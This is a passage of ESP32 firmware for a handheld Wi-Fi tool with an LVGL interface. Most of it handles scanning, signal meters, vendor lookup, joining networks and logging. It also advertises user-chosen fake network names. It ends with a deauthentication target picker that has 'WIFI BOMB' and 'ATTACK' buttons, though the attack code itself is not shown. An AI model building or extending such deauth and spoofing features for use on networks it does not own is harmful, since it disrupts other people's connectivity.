    case WIFI_OP_SCANNING:
      WiFi.mode(WIFI_STA);
      break;
    case WIFI_OP_STA_CONNECTED:
    case WIFI_OP_LAN_DIAGNOSTIC:
      if (WiFi.status() != WL_CONNECTED) return false;
      WiFi.mode(WIFI_STA);
      break;
    case WIFI_OP_MONITOR:
      WiFi.disconnect(false, false);
      WiFi.mode(WIFI_STA);
      break;
    case WIFI_OP_AP_WEB:
      WiFi.mode(WIFI_AP);
      break;
    case WIFI_OP_AP_STA_WEB:
      WiFi.mode(WIFI_AP_STA);
      break;
    case WIFI_OP_CUSTOM_SSIDS:
      WiFi.disconnect(false, false);
      WiFi.mode(WIFI_AP);
      break;
    case WIFI_OP_IDLE:
    default:
      break;
  }
  wifi_operating_state = target;
  return true;
}


bool begin_wifi_lan_diagnostic() {
  const bool ready = wifi_enter_operating_state(WIFI_OP_LAN_DIAGNOSTIC);
  if (ready) set_status("DIAGNOSTICS", COLOR_SETTINGS);
  return ready;
}


void open_wifi_live_signal(lv_event_t *e) {
  (void)e;
  if (wifi_info_label != NULL) {
    lv_label_set_text(wifi_info_label, "Choose a network, then its live signal meter opens.");
  }
  open_wifi_networks(NULL);
}


void ble_feature_info(lv_event_t *e) {
  if (ble_info_label != NULL) {
    lv_label_set_text(ble_info_label,
                      "BLE scanning is next. Apple TV control\nis ready now through the top tile.");
  }
  set_status("SYSTEM READY", COLOR_READY);
}


bool start_wifi_scan(uint8_t purpose) {
  if (wifi_info_label == NULL) return false;

  if (wifi_scan_active) {
    return false;
  }

  // A completed scan should already have released its result records, but do
  // this defensively before measuring heap for a repeat scan.
  WiFi.scanDelete();

  if (!wifi_enter_operating_state(WIFI_OP_SCANNING)) return false;
  wifi_scan_purpose = (WifiScanPurpose)purpose;
  if (purpose == WIFI_SCAN_NETWORKS) {
    if (wifi_results_heading != NULL) lv_label_set_text(wifi_results_heading, "LOOKING FOR NETWORKS...");
    lv_label_set_text(wifi_info_label, "Listening for nearby Wi-Fi networks.");
  }
  set_status("SCANNING", COLOR_GREEN);
  const size_t wifi_internal_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
  const size_t wifi_largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL);
  Serial.printf("Wi-Fi scan preflight: internal=%u largest=%u\n",
                (unsigned)wifi_internal_free, (unsigned)wifi_largest_block);

  // A cold start needs room to allocate the ESP Wi-Fi driver's fixed buffers.
  // Once the first scan has started STA mode those buffers intentionally stay
  // allocated, so repeat scans need only the smaller working/result headroom.
  const bool wifi_driver_started = WiFi.getMode() != WIFI_MODE_NULL;
  const size_t required_free = wifi_driver_started ? 45000 : 110000;
  const size_t required_block = wifi_driver_started ? 20000 : 60000;
  if (wifi_internal_free < required_free || wifi_largest_block < required_block) {
    if (wifi_results_heading != NULL) lv_label_set_text(wifi_results_heading, "SCAN HELD SAFELY");
    lv_label_set_text_fmt(wifi_info_label,
                          "WI-FI SCAN NEEDS MORE FREE\nINTERNAL MEMORY\n\nFree: %u KB  Block: %u KB\n\nClose other radio activity\nand try again.",
                          (unsigned)(wifi_internal_free / 1024),
                          (unsigned)(wifi_largest_block / 1024));
    set_status("SYSTEM READY", COLOR_READY);
    wifi_operating_state = WiFi.status() == WL_CONNECTED ? WIFI_OP_STA_CONNECTED : WIFI_OP_IDLE;
    return false;
  }

  Serial.println("Wi-Fi scan started");

  // Fixed driver buffers reserve a predictable amount of internal RAM. This
  // is more reliable than repeatedly requesting large dynamic buffers while
  // the full LVGL interface is already running.
  WiFi.useStaticBuffers(true);
  WiFi.setSleep(true);
  const int16_t started = WiFi.scanNetworks(true, true);
  if (started == WIFI_SCAN_FAILED) {
    if (wifi_results_heading != NULL) lv_label_set_text(wifi_results_heading, "SCAN RESULTS");
    lv_label_set_text(wifi_info_label, "WI-FI SCAN COULD NOT START.\nTry again in a moment.");
    set_status("SYSTEM READY", COLOR_READY);
    Serial.println("Wi-Fi scan failed to start");
    wifi_operating_state = WiFi.status() == WL_CONNECTED ? WIFI_OP_STA_CONNECTED : WIFI_OP_IDLE;
    return false;
  }
  wifi_scan_active = true;
  return true;
}


void scan_nearby_wifi(lv_event_t *e) {
  (void)e;
  if (wifi_networks_screen != NULL) lv_scr_load(wifi_networks_screen);
  start_wifi_scan(WIFI_SCAN_NETWORKS);
}


const char *wifi_radar_security_label(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN:          return "OPEN";
    case WIFI_AUTH_WEP:           return "WEP";
    case WIFI_AUTH_WPA_PSK:       return "WPA";
    case WIFI_AUTH_WPA2_PSK:      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
    case WIFI_AUTH_OWE:           return "OWE";
    default:                      return "SECURED";
  }
}


const char *wifi_radar_strength_label(int32_t rssi) {
  if (rssi >= -55) return "STRONG";
  if (rssi >= -70) return "GOOD";
  if (rssi >= -82) return "FAIR";
  return "WEAK";
}


const char *wifi_vendor_label(const char *bssid) {
  if (bssid == NULL || strlen(bssid) < 8) return "Unknown vendor";
  struct VendorPrefix { const char *prefix; const char *name; };
  static const VendorPrefix vendors[] = {
    { "00:1A:11", "Google" }, { "3C:5A:B4", "Google" },
    { "00:17:88", "Philips Hue" }, { "18:B4:30", "Nest" },
    { "B8:27:EB", "Raspberry Pi" }, { "DC:A6:32", "Raspberry Pi" },
    { "24:6F:28", "Espressif" }, { "30:AE:A4", "Espressif" }, { "84:F3:EB", "Espressif" },
    { "00:1B:63", "Apple" }, { "F0:18:98", "Apple" },
    { "00:14:22", "Dell" }, { "00:1E:C2", "Apple" },
    { "00:18:E7", "Cameo" }, { "00:25:9C", "Cisco-Linksys" },
    { "00:26:F2", "Netgear" }, { "14:59:C0", "Netgear" },
    { "50:C7:BF", "TP-Link" }, { "60:32:B1", "TP-Link" },
    { "00:11:32", "Synology" }, { "00:15:5D", "Microsoft" },
    { "00:1C:B3", "Apple" }, { "00:23:69", "Cisco-Linksys" },
    { "00:24:D7", "Intel" }, { "00:27:10", "Intel" },
    { "28:CF:E9", "Apple" }, { "34:97:F6", "ASUSTek" },
    { "44:07:0B", "Google" }, { "48:A4:72", "Intel" },
    { "5C:CF:7F", "Espressif" }, { "68:7F:74", "Cisco-Linksys" },
    { "74:DA:38", "Edimax" }, { "88:71:E5", "Amazon" },
    { "A4:77:33", "Google" }, { "AC:84:C6", "TP-Link" },
    { "B0:BE:76", "TP-Link" }, { "C8:3A:35", "Tenda" },
    { "CC:50:E3", "Espressif" }, { "D8:0D:17", "TP-Link" },
    { "E4:F0:42", "Google" }, { "F4:F5:D8", "Google" }
  };
  char prefix[9];
  memcpy(prefix, bssid, 8);
  prefix[8] = '\0';
  for (uint8_t i = 0; i < sizeof(vendors) / sizeof(vendors[0]); i++)
    if (strcasecmp(prefix, vendors[i].prefix) == 0) return vendors[i].name;
  return "Unknown vendor";
}


void add_wifi_rssi_history(int32_t rssi) {
  if (wifi_rssi_history_count < WIFI_RSSI_HISTORY_POINTS) wifi_rssi_history_count++;
  memmove(wifi_rssi_history, wifi_rssi_history + 1, WIFI_RSSI_HISTORY_POINTS - 1);
  wifi_rssi_history[WIFI_RSSI_HISTORY_POINTS - 1] = constrain(rssi, -100, -30);
  for (uint8_t i = 0; i < WIFI_RSSI_HISTORY_POINTS; i++) {
    if (wifi_rssi_history_bars[i] == NULL) continue;
    const int height = map(wifi_rssi_history[i] == 0 ? -100 : wifi_rssi_history[i], -100, -30, 2, 60);
    lv_obj_set_height(wifi_rssi_history_bars[i], constrain(height, 2, 60));
    lv_obj_align(wifi_rssi_history_bars[i], LV_ALIGN_BOTTOM_MID, 0, 0);
  }
}


void refresh_wifi_channel_chart() {
  uint8_t channel_counts[13] = {};
  uint8_t highest = 1;
  uint32_t highest_activity = 1;
  for (uint8_t i = 0; i < wifi_result_count; i++) {
    if (wifi_results[i].channel >= 1 && wifi_results[i].channel <= 13) {
      uint8_t &count = channel_counts[wifi_results[i].channel - 1];
      count++;
      if (count > highest) highest = count;
    }
  }
  for (uint8_t i = 0; i < 13; i++)
    if (wifi_channel_packet_counts[i] > highest_activity) highest_activity = wifi_channel_packet_counts[i];
  for (uint8_t i = 0; i < 13; i++) {
    if (wifi_channel_bars[i] != NULL) {
      const int ap_height = channel_counts[i] == 0 ? 3 : 12 + (channel_counts[i] * 92 / highest);
      const int activity_height = wifi_channel_packet_counts[i] == 0 ? 3 : 8 + (wifi_channel_packet_counts[i] * 100 / highest_activity);
      const int height = max(ap_height, activity_height);
      lv_obj_set_height(wifi_channel_bars[i], height);
      lv_obj_align(wifi_channel_bars[i], LV_ALIGN_BOTTOM_MID, 0, 0);
    }
    if (wifi_channel_count_labels[i] != NULL) {
      lv_label_set_text_fmt(wifi_channel_count_labels[i], "%u", channel_counts[i]);
    }
  }
}


void open_wifi_network_detail(lv_event_t *e) {
  const uint8_t index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (index >= wifi_result_count || wifi_detail_screen == NULL) return;
  wifi_selected_network = index;
  wifi_rssi_history_count = 0;
  memset(wifi_rssi_history, 0, sizeof(wifi_rssi_history));
  WifiNetworkResult &network = wifi_results[index];
  strlcpy(wifi_selected_bssid, network.bssid, sizeof(wifi_selected_bssid));
  lv_label_set_text(wifi_detail_name_label, network.ssid);
  lv_label_set_text_fmt(wifi_detail_info_label,
                        "%s  |  %ld dBm\nChannel %u  |  %s\n%s\n%s",
                        wifi_radar_strength_label(network.rssi), (long)network.rssi,
                        network.channel, wifi_radar_security_label(network.auth),
                        network.bssid, wifi_vendor_label(network.bssid));
  const int meter_width = constrain(map(network.rssi, -95, -35, 8, 252), 8, 252);
  lv_obj_set_width(wifi_detail_meter_fill, meter_width);
  add_wifi_rssi_history(network.rssi);
  lv_scr_load(wifi_detail_screen);
  wifi_live_scan_due_ms = millis();
}


void open_selected_wifi_connection(lv_event_t *e) {
  (void)e;
  if (wifi_selected_network < 0 || wifi_selected_network >= wifi_result_count ||
      wifi_connect_screen == NULL) return;
  WifiNetworkResult &network = wifi_results[wifi_selected_network];
  if (strcmp(network.ssid, "Hidden network") == 0) {
    lv_label_set_text(wifi_detail_info_label,
                      "HIDDEN NETWORK\nUse Settings > Wi-Fi > Setup Portal\nto enter its network name.");
    return;
  }
  wifi_live_scan_due_ms = 0;
  lv_label_set_text_fmt(wifi_connect_network_label,
                        "%s\n%s  |  CH %u",
                        network.ssid, wifi_radar_security_label(network.auth), network.channel);
  lv_textarea_set_text(wifi_connect_password_textarea, "");
  if (network.auth == WIFI_AUTH_OPEN) {
    lv_textarea_set_placeholder_text(wifi_connect_password_textarea, "Open network - no password needed");
    lv_label_set_text(wifi_connect_status_label, "Tap CONNECT & SAVE to join this open network.");
  } else {
    lv_textarea_set_placeholder_text(wifi_connect_password_textarea, "Wi-Fi password");
    lv_label_set_text(wifi_connect_status_label, "Enter the network password, then connect.");
  }
  lv_scr_load(wifi_connect_screen);
  lv_keyboard_set_textarea(wifi_connect_keyboard, wifi_connect_password_textarea);
  set_status("SYSTEM READY", COLOR_READY);
}


void connect_selected_wifi(lv_event_t *e) {
  (void)e;
  if (wifi_selected_network < 0 || wifi_selected_network >= wifi_result_count) return;
  WifiNetworkResult &network = wifi_results[wifi_selected_network];
  const char *password = lv_textarea_get_text(wifi_connect_password_textarea);
  if (network.auth != WIFI_AUTH_OPEN && (password == NULL || password[0] == '\0')) {
    lv_label_set_text(wifi_connect_status_label, "Enter the Wi-Fi password first.");
    return;
  }
  strlcpy(wifi_connect_pending_ssid, network.ssid, sizeof(wifi_connect_pending_ssid));
  strlcpy(wifi_connect_pending_password, password == NULL ? "" : password,
          sizeof(wifi_connect_pending_password));
  if (!wifi_enter_operating_state(WIFI_OP_STA_CONNECTING)) {
    lv_label_set_text(wifi_connect_status_label, "Could not prepare the Wi-Fi radio.");
    return;
  }
  if (network.auth == WIFI_AUTH_OPEN)
    WiFi.begin(wifi_connect_pending_ssid);
  else
    WiFi.begin(wifi_connect_pending_ssid, wifi_connect_pending_password);
  wifi_connect_pending = true;
  wifi_connect_started_ms = millis();
  lv_label_set_text_fmt(wifi_connect_status_label, "CONNECTING TO\n%s", wifi_connect_pending_ssid);
  set_status("CONNECTING", COLOR_SETTINGS);
}


void cancel_wifi_connection(lv_event_t *e) {
  (void)e;
  if (wifi_operating_state == WIFI_OP_STA_CONNECTING) {
    WiFi.disconnect(false, false);
    wifi_operating_state = WIFI_OP_IDLE;
  }
  wifi_connect_pending = false;
  wifi_connect_started_ms = 0;
  lv_scr_load(wifi_detail_screen);
  wifi_live_scan_due_ms = millis() + 1200;
  set_status("SYSTEM READY", COLOR_READY);
}


void refresh_wifi_network_list() {
  if (wifi_network_list == NULL) return;
  lv_obj_clean(wifi_network_list);
  if (wifi_result_count == 0) {
    lv_obj_t *empty = lv_label_create(wifi_network_list);
    lv_label_set_text(empty, "No nearby networks found.\nMove closer and scan again.");
    lv_obj_set_style_text_color(empty, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_align(empty, LV_ALIGN_TOP_MID, 0, 20);
    return;
  }
  for (uint8_t i = 0; i < wifi_result_count; i++) {
    WifiNetworkResult &network = wifi_results[i];
    lv_obj_t *row = lv_btn_create(wifi_network_list);
    lv_obj_set_size(row, 276, 52);
    lv_obj_set_pos(row, 0, i * 58);
    lv_obj_set_style_bg_color(row, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
    lv_obj_set_style_border_color(row, lv_color_hex(i == 0 ? COLOR_GREEN : COLOR_SETTINGS), LV_PART_MAIN);
    lv_obj_set_style_border_width(row, 1, LV_PART_MAIN);
    lv_obj_set_style_radius(row, 9, LV_PART_MAIN);
    lv_obj_add_event_cb(row, open_wifi_network_detail, LV_EVENT_CLICKED, (void *)(uintptr_t)i);
    lv_obj_t *name = lv_label_create(row);
    lv_label_set_text(name, network.ssid);
    lv_obj_set_width(name, 164);
    lv_label_set_long_mode(name, LV_LABEL_LONG_DOT);
    lv_obj_set_style_text_color(name, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
    lv_obj_set_style_text_font(name, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(name, LV_ALIGN_TOP_LEFT, -4, -4);
    lv_obj_t *details = lv_label_create(row);
    lv_label_set_text_fmt(details, "CH %u   %s", network.channel,
                          wifi_radar_security_label(network.auth));
    lv_obj_set_style_text_color(details, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_set_style_text_font(details, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(details, LV_ALIGN_BOTTOM_LEFT, -4, 4);
    lv_obj_t *signal = lv_label_create(row);
    lv_label_set_text_fmt(signal, "%ld\ndBm", (long)network.rssi);
    lv_obj_set_style_text_align(signal, LV_TEXT_ALIGN_RIGHT, LV_PART_MAIN);
    lv_obj_set_style_text_color(signal, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
    lv_obj_set_style_text_font(signal, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(signal, LV_ALIGN_RIGHT_MID, 3, 0);
  }
}


void finish_nearby_wifi_scan() {
  if (!wifi_scan_active) return;
  const int16_t found = WiFi.scanComplete();
  if (found == WIFI_SCAN_RUNNING) return;
  wifi_scan_active = false;

  if (found <= 0) {
    snprintf(wifi_scan_report, sizeof(wifi_scan_report),
             found == WIFI_SCAN_FAILED ? "WI-FI SCAN FAILED.\nTry again in a moment." :
             "No nearby Wi-Fi networks found.\nMove closer and try again.");
  } else {
    wifi_result_count = min((int)MAX_WIFI_RESULTS, (int)found);
    for (uint8_t network = 0; network < wifi_result_count; network++) {
      String name = WiFi.SSID(network);
      if (name.length() == 0) name = "Hidden network";
      strlcpy(wifi_results[network].ssid, name.c_str(), sizeof(wifi_results[network].ssid));
      String bssid = WiFi.BSSIDstr(network);
      strlcpy(wifi_results[network].bssid, bssid.c_str(), sizeof(wifi_results[network].bssid));
      wifi_results[network].rssi = WiFi.RSSI(network);
      wifi_results[network].channel = WiFi.channel(network);
      wifi_results[network].auth = WiFi.encryptionType(network);
    }
    int used = snprintf(wifi_scan_report, sizeof(wifi_scan_report),
                        "NETWORKS  |  %d FOUND\n\n", found);
    for (int network = 0; network < found && used >= 0; network++) {
      String name = WiFi.SSID(network);
      if (name.length() == 0) name = "Hidden network";
      char row[96];
      const int row_length = snprintf(
        row, sizeof(row), "%02d  %.20s\n    %ld dBm  CH%u  %s\n\n",
        network + 1, name.c_str(), (long)WiFi.RSSI(network), WiFi.channel(network),
        wifi_radar_security_label(WiFi.encryptionType(network))
      );
      if (row_length <= 0) continue;
      if (used + row_length >= (int)sizeof(wifi_scan_report) - 1) {
        snprintf(wifi_scan_report + used, sizeof(wifi_scan_report) - used,
                 "... %d more network%s not shown", found - network,
                 found - network == 1 ? "" : "s");
        break;
      }
      memcpy(wifi_scan_report + used, row, row_length);
      used += row_length;
      wifi_scan_report[used] = '\0';
    }
  }

  if (found <= 0 && wifi_scan_purpose == WIFI_SCAN_NETWORKS) wifi_result_count = 0;
  WiFi.scanDelete();
  wifi_operating_state = WiFi.status() == WL_CONNECTED ? WIFI_OP_STA_CONNECTED : WIFI_OP_IDLE;
  if (wifi_scan_purpose == WIFI_SCAN_LIVE_SIGNAL && wifi_selected_network >= 0) {
    for (uint8_t i = 0; i < wifi_result_count; i++) {
      if (strcmp(wifi_results[i].bssid, wifi_selected_bssid) == 0) {
        wifi_selected_network = i;
        WifiNetworkResult &network = wifi_results[i];
        lv_label_set_text_fmt(wifi_detail_info_label,
                              "%s  |  %ld dBm\nChannel %u  |  %s\n%s\n%s",
                              wifi_radar_strength_label(network.rssi), (long)network.rssi,
                              network.channel, wifi_radar_security_label(network.auth), network.bssid,
                              wifi_vendor_label(network.bssid));
        const int meter_width = constrain(map(network.rssi, -95, -35, 8, 252), 8, 252);
        lv_obj_set_width(wifi_detail_meter_fill, meter_width);
        add_wifi_rssi_history(network.rssi);
        break;
      }
    }
    wifi_live_scan_due_ms = millis() + 1200;
  } else {
    if (wifi_results_heading != NULL) lv_label_set_text_fmt(wifi_results_heading, "%d NETWORK%s FOUND", found > 0 ? found : 0, found == 1 ? "" : "S");
    if (wifi_info_label != NULL) lv_label_set_text(wifi_info_label, found > 0 ? "Tap a network to see its details." : wifi_scan_report);
    refresh_wifi_network_list();
    refresh_wifi_channel_chart();
  }
  Serial.printf("Wi-Fi scan found %d network(s)\n", found);
  set_status("SYSTEM READY", COLOR_READY);
}


void show_wifi_status(lv_event_t *e) {
  if (wifi_info_label == NULL) return;

  if (wifi_results_heading != NULL) lv_label_set_text(wifi_results_heading, "CONNECTION STATUS");

  if (WiFi.status() == WL_CONNECTED) {
    String ssid = WiFi.SSID();
    String address = WiFi.localIP().toString();
    char report[180];
    snprintf(report, sizeof(report), "CONNECTED\n%s\n%s", ssid.c_str(), address.c_str());
    lv_label_set_text(wifi_info_label, report);
  } else {
    lv_label_set_text(wifi_info_label,
                      "NOT CONNECTED\n\nNearby scan works without joining.\nYour-network device view comes after\na secure Wi-Fi connection screen.");
  }
  set_status("SYSTEM READY", COLOR_READY);
}


void save_wifi_scan_history(lv_event_t *e) {
  (void)e;
  if (!sd_card_ready || wifi_result_count == 0) {
    if (wifi_results_heading != NULL) lv_label_set_text(wifi_results_heading, "NOTHING TO SAVE");
    return;
  }
  File log = SD_MMC.open("/wifi_scan_history.csv", FILE_APPEND);
  if (!log) {
    lv_label_set_text(wifi_results_heading, "SAVE FAILED");
    return;
  }
  if (log.size() == 0) log.println("uptime_ms,ssid,bssid,channel,rssi,security,vendor");
  for (uint8_t i = 0; i < wifi_result_count; i++)
    log.printf("%lu,\"%s\",%s,%u,%ld,%s,\"%s\"\n", millis(), wifi_results[i].ssid,
               wifi_results[i].bssid, wifi_results[i].channel, (long)wifi_results[i].rssi,
               wifi_radar_security_label(wifi_results[i].auth), wifi_vendor_label(wifi_results[i].bssid));
  log.close();
  lv_label_set_text_fmt(wifi_results_heading, "SAVED %u NETWORKS", wifi_result_count);
}


void open_wifi_networks(lv_event_t *e) {
  (void)e;
  if (wifi_networks_screen == NULL) return;
  if (wifi_monitor_running) stop_wifi_monitor();
  lv_scr_load(wifi_networks_screen);
  if (wifi_result_count == 0) start_wifi_scan(WIFI_SCAN_NETWORKS);
}


void open_wifi_channels(lv_event_t *e) {
  (void)e;
  if (wifi_channels_screen == NULL) return;
  refresh_wifi_channel_chart();
  lv_scr_load(wifi_channels_screen);
  if (!wifi_monitor_running && !wifi_scan_active) start_wifi_monitor(true);
}


void back_to_wifi_home(lv_event_t *e) {
  (void)e;
  wifi_live_scan_due_ms = 0;
  if (wifi_monitor_running) stop_wifi_monitor();
  if (wifi_screen != NULL) lv_scr_load(wifi_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void back_to_wifi_networks(lv_event_t *e) {
  (void)e;
  wifi_live_scan_due_ms = 0;
  if (wifi_networks_screen != NULL) lv_scr_load(wifi_networks_screen);
}


void refresh_wifi_channels(lv_event_t *e) {
  (void)e;
  start_wifi_scan(WIFI_SCAN_NETWORKS);
}


void service_wifi_live_monitor() {
  if (wifi_detail_screen == NULL || lv_scr_act() != wifi_detail_screen) return;
  if (wifi_scan_active || wifi_live_scan_due_ms == 0) return;
  if ((int32_t)(millis() - wifi_live_scan_due_ms) >= 0) {
    if (!start_wifi_scan(WIFI_SCAN_LIVE_SIGNAL)) wifi_live_scan_due_ms = millis() + 1500;
  }
}


void open_wifi_custom_ssids(lv_event_t *e) {
  (void)e;
  if (wifi_custom_ssids_screen == NULL) return;
  wifi_custom_ssid_edit_index = -1;
  refresh_wifi_custom_ssid_screen();
  lv_scr_load(wifi_custom_ssids_screen);
}


void add_wifi_custom_ssid(lv_event_t *e) {
  (void)e;
  if (wifi_custom_ssid_running) {
    lv_label_set_text(wifi_custom_ssid_status_label, "STOP advertising before editing the list.");
    return;
  }
  if (wifi_custom_ssid_count >= WIFI_CUSTOM_SSID_MAX) {
    lv_label_set_text(wifi_custom_ssid_status_label, "List full: delete a name before adding another.");
    return;
  }
  wifi_custom_ssid_edit_index = -1;
  lv_textarea_set_text(wifi_custom_ssid_textarea, "");
  lv_scr_load(wifi_custom_ssid_editor_screen);
}


void edit_wifi_custom_ssid(lv_event_t *e) {
  (void)e;
  if (wifi_custom_ssid_running || wifi_custom_ssid_edit_index < 0 ||
      wifi_custom_ssid_edit_index >= wifi_custom_ssid_count) {
    lv_label_set_text(wifi_custom_ssid_status_label,
                      wifi_custom_ssid_running ? "STOP advertising before editing the list." :
                      "Tap a saved row first, then tap EDIT.");
    return;
  }
  lv_textarea_set_text(wifi_custom_ssid_textarea, wifi_custom_ssids[wifi_custom_ssid_edit_index]);
  lv_scr_load(wifi_custom_ssid_editor_screen);
}


void commit_wifi_custom_ssid(lv_event_t *e) {
  (void)e;
  const char *entered = lv_textarea_get_text(wifi_custom_ssid_textarea);
  while (*entered == ' ') entered++;
  if (*entered == '\0') return;
  if (wifi_custom_ssid_edit_index < 0) {
    wifi_custom_ssid_edit_index = wifi_custom_ssid_count++;
    wifi_custom_ssid_selected[wifi_custom_ssid_edit_index] = true;
  }
  strlcpy(wifi_custom_ssids[wifi_custom_ssid_edit_index], entered,
          sizeof(wifi_custom_ssids[wifi_custom_ssid_edit_index]));
  refresh_wifi_custom_ssid_screen();
  lv_scr_load(wifi_custom_ssids_screen);
}


void cancel_wifi_custom_ssid_editor(lv_event_t *e) {
  (void)e;
  refresh_wifi_custom_ssid_screen();
  lv_scr_load(wifi_custom_ssids_screen);
}


void delete_wifi_custom_ssid(lv_event_t *e) {
  (void)e;
  if (wifi_custom_ssid_running || wifi_custom_ssid_edit_index < 0 ||
      wifi_custom_ssid_edit_index >= wifi_custom_ssid_count) {
    lv_label_set_text(wifi_custom_ssid_status_label,
                      wifi_custom_ssid_running ? "STOP advertising before editing the list." :
                      "Tap a saved row first, then tap DELETE.");
    return;
  }
  for (uint8_t i = wifi_custom_ssid_edit_index; i + 1 < wifi_custom_ssid_count; i++) {
    strlcpy(wifi_custom_ssids[i], wifi_custom_ssids[i + 1], sizeof(wifi_custom_ssids[i]));
    wifi_custom_ssid_selected[i] = wifi_custom_ssid_selected[i + 1];
  }
  wifi_custom_ssid_count--;
  wifi_custom_ssids[wifi_custom_ssid_count][0] = '\0';
  wifi_custom_ssid_selected[wifi_custom_ssid_count] = false;
  wifi_custom_ssid_edit_index = -1;
  refresh_wifi_custom_ssid_screen();
}


void persist_wifi_custom_ssids(lv_event_t *e) {
  (void)e;
  save_wifi_custom_ssids();
  lv_label_set_text(wifi_custom_ssid_status_label, "SAVED  |  Names, selections and channel kept after reboot.");
}


void change_wifi_custom_ssid_channel(lv_event_t *e) {
  if (wifi_custom_ssid_running) {
    lv_label_set_text(wifi_custom_ssid_status_label, "STOP advertising before changing channel.");
    return;
  }
  const int8_t direction = (int8_t)(intptr_t)lv_event_get_user_data(e);
  int channel = wifi_custom_ssid_channel + direction;
  if (channel < 1) channel = 13;
  if (channel > 13) channel = 1;
  wifi_custom_ssid_channel = channel;
  refresh_wifi_custom_ssid_screen();
}


void toggle_wifi_custom_ssids(lv_event_t *e) {
  (void)e;
  if (wifi_custom_ssid_running) {
    lv_label_set_text(wifi_custom_ssid_status_label, "Already ACTIVE. Tap STOP before restarting.");
    return;
  }
  if (wifi_custom_ssid_selected_count() == 0) {
    lv_label_set_text(wifi_custom_ssid_status_label, "Select at least one saved name before START.");
    return;
  }
  if (!wifi_enter_operating_state(WIFI_OP_CUSTOM_SSIDS)) {
    lv_label_set_text(wifi_custom_ssid_status_label, "Could not prepare the Wi-Fi radio.");
    return;
  }
  for (uint8_t i = 0; i < wifi_custom_ssid_count; i++) {
    if (wifi_custom_ssid_selected[i] && advertise_wifi_custom_ssid(i)) {
      wifi_custom_ssid_running = true;
      set_status("TRANSMITTING", COLOR_SETTINGS);
      refresh_wifi_custom_ssid_screen();
      return;
    }
  }
  stop_wifi_custom_ssids();
  lv_label_set_text(wifi_custom_ssid_status_label, "Could not start the selected test network.");
}


void stop_wifi_custom_ssids_event(lv_event_t *e) {
  (void)e;
  stop_wifi_custom_ssids();
}


// ============================================================
// WI-FI DEAUTH TARGET PICKER
// ============================================================
// Real scan results populate the target list for the live deauth screen.

lv_obj_t *wifi_defensive_monitor_screen = NULL;
lv_obj_t *wifi_defensive_target_list = NULL;
lv_obj_t *wifi_defensive_target_label = NULL;
lv_obj_t *wifi_deauth_picker_status_label = NULL;
int8_t wifi_defensive_target_index = -1;
uint8_t wifi_defensive_last_result_count = 0;

void create_wifi_deauth_target_screen() {
  wifi_defensive_monitor_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_defensive_monitor_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_defensive_monitor_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_defensive_monitor_screen, false);
  create_header(wifi_defensive_monitor_screen, "DEAUTH");
  wifi_deauth_picker_status_label = lv_label_create(wifi_defensive_monitor_screen);
  lv_label_set_text(wifi_deauth_picker_status_label, "Choose a Wi-Fi name");
  lv_obj_set_width(wifi_deauth_picker_status_label, 300);
  lv_obj_set_style_text_align(wifi_deauth_picker_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_deauth_picker_status_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_deauth_picker_status_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(wifi_deauth_picker_status_label, 10, 84);
  wifi_defensive_target_label = lv_label_create(wifi_defensive_monitor_screen);
  lv_label_set_text(wifi_defensive_target_label, "TARGET: NONE SELECTED");
  lv_obj_set_width(wifi_defensive_target_label, 296);
  lv_label_set_long_mode(wifi_defensive_target_label, LV_LABEL_LONG_DOT);
  lv_obj_set_style_text_align(wifi_defensive_target_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_defensive_target_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_defensive_target_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(wifi_defensive_target_label, 12, 110);
  wifi_defensive_target_list = lv_obj_create(wifi_defensive_monitor_screen);
  lv_obj_set_size(wifi_defensive_target_list, 296, 204);
  lv_obj_set_pos(wifi_defensive_target_list, 12, 134);
  lv_obj_set_style_pad_all(wifi_defensive_target_list, 6, LV_PART_MAIN);
  lv_obj_set_style_bg_color(wifi_defensive_target_list, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(wifi_defensive_target_list, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(wifi_defensive_target_list, 1, LV_PART_MAIN);
  lv_obj_set_scroll_dir(wifi_defensive_target_list, LV_DIR_VER);
  create_button(wifi_defensive_monitor_screen, 8, 346, 94, 38,
                "SEARCH", COLOR_RF, scan_wifi_defensive_targets);
  lv_obj_t *wifi_deauth_bomb_button = create_button(
    wifi_defensive_monitor_screen, 110, 346, 94, 38,
    "WIFI BOMB", COLOR_RED, start_wifi_bomb_live
  );
  lv_obj_set_style_text_font(lv_obj_get_child(wifi_deauth_bomb_button, 0),
                             &lv_font_montserrat_10, LV_PART_MAIN);
   create_button(wifi_defensive_monitor_screen, 212, 346, 100, 38,
                 "ATTACK", COLOR_GREEN, handle_target_picker_attack_click);
  create_button(wifi_defensive_monitor_screen, 70, 394, 180, 30,
